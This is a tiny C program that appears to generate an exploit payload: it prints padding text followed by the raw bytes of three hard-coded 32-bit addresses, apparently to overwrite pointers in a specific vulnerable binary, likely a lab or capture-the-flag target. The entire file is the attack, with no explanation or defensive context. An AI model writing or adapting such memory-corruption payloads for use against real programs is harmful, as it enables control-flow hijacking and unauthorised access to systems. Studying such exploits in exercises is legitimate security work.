#include <stdio.h>

int main()
{
    unsigned int ppay=0x0804968a;
    unsigned int jinfo=0x0804981e;
    unsigned int newAddr=0x0804e1d0;

    printf("adam456789abcdef0000%s%s%sadam\n", (char*)&ppay, (char*)&jinfo, (char*)&newAddr);
}